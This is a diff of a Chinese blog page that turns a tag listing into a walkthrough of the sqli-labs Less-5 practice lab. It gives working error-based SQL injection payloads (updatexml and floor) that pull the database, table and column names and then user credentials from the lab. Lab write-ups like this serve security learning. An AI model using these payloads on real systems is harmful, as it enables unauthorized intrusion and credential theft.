@@ -6,21 +6,26 @@
     
 
     
-    <title>标签：: SSTI | 1eAder</title>
+    <title>sqli-labs-less-5通关笔记 | 1eAder</title>
     
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     
-    <meta name="description" content="本博客专注于ctf比赛和网络安全攻防技术，热爱网络技术并且也很愿意结交热爱网络技术的你们.我是一个热爱网络技术的少年">
-<meta name="keywords" content="CTF,hacker,seo,一个热爱网络技术的少年,网络攻防,内网渗透技术">
-<meta property="og:type" content="website">
-<meta property="og:title" content="1eAder">
-<meta property="og:url" content="https://leaderzhang.github.io/tags/SSTI/index.html">
+        <meta name="keywords" content="sqli-labs" />
+    
+    <meta name="description" content="Sql注入学习笔记——基于Sqli-labs平台(Less-5)首先，老规矩，单双引号测试。发现单引号报错，语句如下You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#39;&amp;#3">
+<meta name="keywords" content="sqli-labs">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs-less-5通关笔记">
+<meta property="og:url" content="https://leaderzhang.github.io/2018/10/22/sqli-labs-less5/index.html">
 <meta property="og:site_name" content="1eAder">
-<meta property="og:description" content="本博客专注于ctf比赛和网络安全攻防技术，热爱网络技术并且也很愿意结交热爱网络技术的你们.我是一个热爱网络技术的少年">
+<meta property="og:description" content="Sql注入学习笔记——基于Sqli-labs平台(Less-5)首先，老规矩，单双引号测试。发现单引号报错，语句如下You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#39;&amp;#3">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://i.imgur.com/7YOWcXy.png">
+<meta property="og:updated_time" content="2018-10-22T03:02:19.151Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="1eAder">
-<meta name="twitter:description" content="本博客专注于ctf比赛和网络安全攻防技术，热爱网络技术并且也很愿意结交热爱网络技术的你们.我是一个热爱网络技术的少年">
+<meta name="twitter:title" content="sqli-labs-less-5通关笔记">
+<meta name="twitter:description" content="Sql注入学习笔记——基于Sqli-labs平台(Less-5)首先，老规矩，单双引号测试。发现单引号报错，语句如下You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#39;&amp;#3">
+<meta name="twitter:image" content="https://i.imgur.com/7YOWcXy.png">
     
 
     
@@ -135,82 +140,152 @@
                         <div class="main-body-header">
     <h1 class="header">
     
-    <i class="icon fa fa-tag"></i>标签：: <em>SSTI</em>
+    <a class="page-title-link" href="/categories/sqli-labs/">sqli-labs</a>
     </h1>
 </div>
 
                         <div class="main-body-content">
-                            
-
-    
-    
+                            <article id="pages-sqli-labs-less5" class="article article-single article-type-pages" itemscope itemprop="blogPost">
+    <div class="article-inner">
         
-        
-        <section class="archives-wrap">
-            <div class="archive-year-wrap">
-                <a href="/archives/2018" class="archive-year"><i class="icon fa fa-calendar-o"></i>2018</a>
-            </div>
-            <div class="archives">
-    
-    
-    
-        <div class="article-row">
-    
-        <article class="article article-summary">
-    <div class="article-summary-inner">
-        
-        <a href="/2018/10/14/study-ssti/" class="thumbnail">
-    
-    
-        <span style="background-image:url(https://i.imgur.com/XHpYuJE.png)" alt="服务端模板注入(SSTI)学习笔记" class="thumbnail-image"></span>
-    
-    
-        
-<span class="comment-counter">
-    <i class="fa fa-comments-o"></i>
-    
-        <span class="disqus-comment-count" data-disqus-identifier="" data-disqus-url="https://leaderzhang.github.io/2018/10/14/study-ssti/">0</span>
-    
-</span>
-
-
-    
-</a>
-
-        
-        <div class="article-meta">
-            <div class="category">
-            <a class="article-category-link" href="/categories/WEB安全/">WEB安全</a>
-            </div>
-            <div class="date"><time datetime="2018-10-13T19:02:55.000Z" itemprop="datePublished">2018-10-14</time></div>
-        </div>
-        
+            <header class="article-header">
+                
     
         <h1 class="article-title" itemprop="name">
-        <a href="/2018/10/14/study-ssti/">服务端模板注入(SSTI)学习笔记</a>
+        sqli-labs-less-5通关笔记
         </h1>
     
 
-        <p class="article-excerpt">
-            #服务端模板注入(SSTI)学习笔记
-我在学习laravel的时候，了解到了模板引擎这一说法。一般来说，框架型的网站都会用到模板引擎这个东西，因为这个东西很方便开发者从后端传递给前端一些特定的值，来到达前后端的交互。
+            </header>
+        
+        
+            <div class="article-meta">
+                
+    <div class="article-date">
+        <a href="/2018/10/22/sqli-labs-less5/" class="article-date">
+            <time datetime="2018-10-22T03:01:22.000Z" itemprop="datePublished">2018-10-22</time>
+        </a>
+    </div>
 
-So，模板注入这个东西的起因就是因为方便
+		
+
+                
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/sqli-labs/">sqli-labs</a>
+    </div>
+
+            </div>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+            <h1 id="Sql注入学习笔记——基于Sqli-labs平台-Less-5"><a href="#Sql注入学习笔记——基于Sqli-labs平台-Less-5" class="headerlink" title="Sql注入学习笔记——基于Sqli-labs平台(Less-5)"></a>Sql注入学习笔记——基于Sqli-labs平台(Less-5)</h1><p>首先，老规矩，单双引号测试。<br>发现单引号报错，语句如下<br><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</code><br><img src="https://i.imgur.com/7YOWcXy.png" alt="单引号测试"></p>
+<p>闭合语句试试<br><img src="https://i.imgur.com/qDIxK6i.png" alt="闭合语句"></p>
+<p>这一关可以报错，但是没有回显位，说明是<strong>报错注入</strong></p>
+<p>十种Mysql报错注入的语句：<a href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html" title="十种Mysql报错注入语句" target="_blank" rel="noopener">https://www.cnblogs.com/wocalieshenmegui/p/5917967.html</a></p>
+<p>我一般喜欢用updatexml()或者floor报错常用的<br><img src="https://i.imgur.com/IAV26vm.png" alt="updatexml报错注入"></p>
+<p>Updatexml报错注入的Payload：<br><code>index.php?id=1%27%20and%20(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))%23</code></p>
+<p><img src="https://i.imgur.com/8vhIAjy.png" alt="floor报错注入"></p>
+<p>Floor报错注入的Payload：<br><code>index.php?id=1%27%20and%20(select%201%20from%20(select%20count(*),concat(user(),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23</code></p>
+<p>报错注入显示数据库：<br><img src="https://i.imgur.com/ay18VzG.png" alt="报错显示数据库名"></p>
+<p>payload:<br><code>index.php?id=1%27%20and%20(updatexml(1,concat(0x7e,(select database()),0x7e),1))%23</code></p>
+<p>报错注入显示表名：<br><img src="https://i.imgur.com/D1B3rhe.png" alt="报错注入显示第一个表名"></p>
+<p>Payload:<br><code>index.php?id=1%27%20and%20(updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),0x7e),1))%23</code></p>
+<p>我偷懒，直接显示第四个表名了，不一个一个列出来了。</p>
+<p>显示第四个表名：<br><img src="https://i.imgur.com/IdT3JB1.png" alt="报错显示第四个表名"></p>
+<p>Payload:<br><code>index.php?id=1%27%20and%20(updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),0x7e),1))%23</code></p>
+<p>接下来爆列名<br>我也直接偷懒啦~直接爆第二个列名，username</p>
+<p><img src="https://i.imgur.com/JN0J9Wp.png" alt="显示第二个列名"></p>
+<p>Payload：<br><code>index.php?id=1%27%20and%20(updatexml(1,concat(0x7e,(select%20column_name%20from%20information_schema.columns%20where%20table_schema=%27security%27%20and%20table_name=%27users%27%20limit%201,1),0x7e),1))%23</code></p>
+<p>ok！我们得知数据库名为security，表名为users，列名：id,username,password</p>
+<p>直接爆数据</p>
+<p>报错显示第5行的username字段内容：</p>
+<p><img src="https://i.imgur.com/w1t5MXZ.png" alt="报错显示第五行username字段内容"></p>
+<p>payload：<br><code>index.php?id=1%27%20and%20(updatexml(1,concat(0x7e,(select%20username%20from%20users limit 4,1),0x7e),1))%23</code></p>
+<p>接下来报错显示第5行的password字段内容：<br><img src="https://i.imgur.com/G7VfFCD.png" alt="显示第5行password内容字段"></p>
+<p>payload:<br><code>index.php?id=1%27%20and%20(updatexml(1,concat(0x7e,(select%20password%20from%20users limit 4,1),0x7e),1))%23</code></p>
+<p>得到username:stupid  password:stupidity</p>
+<p>完成第五关</p>
+
+        </div>
+        <footer class="article-footer">
+            
 
 
-##如何造成的注入呢？
-学习Web安全的时候，有一条规则是大家公认的。
-一切用户可控的值，都是不安全的
-用这次护网杯的一道WEB题来了
-        </p>
+
+    <a data-url="https://leaderzhang.github.io/2018/10/22/sqli-labs-less5/" data-id="cjnjpu38n0007uwnus6zpkiih" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
+<script>
+    (function ($) {
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
+
+            var $this = $(this),
+                url = $this.attr('data-url'),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
+
+            if ($('#' + id).length) {
+                box = $('#' + id);
+
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="article-share-google" target="_blank" title="Google+"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
+            $('.article-share-box.on').hide();
+
+            box.css({
+                top: offset.top + 25,
+                left: offset.left
+            }).addClass('on');
+
+        }).on('click', '.article-share-box', function (e) {
+            e.stopPropagation();
+        }).on('click', '.article-share-box-input', function () {
+            $(this).select();
+        }).on('click', '.article-share-box-link', function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+        });
+    })(jQuery);
+</script>
+
+        </footer>
     </div>
 </article>
-    
-        </div>
-    
 
+    <section id="comments">
+    
+        
+    <div id="disqus_thread">
+        <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
 
-    </div></section>
+    
+    </section>
 
 
 
@@ -272,6 +347,19 @@ So，模板注入这个东西的起因就是因为方便
             
         </ul>
     </div>
+    
+        
+<nav id="article-nav">
+    
+    
+        <a href="/2018/10/19/sqli-labs-less4/" id="article-nav-older" class="article-nav-link-wrap">
+        <strong class="article-nav-caption">上一篇</strong>
+        <p class="article-nav-title">sqli-labs-less-4通关笔记</p>
+        <i class="icon fa fa-chevron-left" id="icon-chevron-left"></i>
+        </a>
+    
+</nav>
+
     
     <div class="widgets-container">
         
@@ -480,11 +568,13 @@ So，模板注入这个东西的起因就是因为方便
     var disqus_shortname = 'hexo-theme-hueman';
     
     
+    var disqus_url = 'https://leaderzhang.github.io/2018/10/22/sqli-labs-less5/';
+    
     (function() {
     var dsq = document.createElement('script');
     dsq.type = 'text/javascript';
     dsq.async = true;
-    dsq.src = '//' + disqus_shortname + '.disqus.com/count.js';
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
     (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
     })();
     </script>
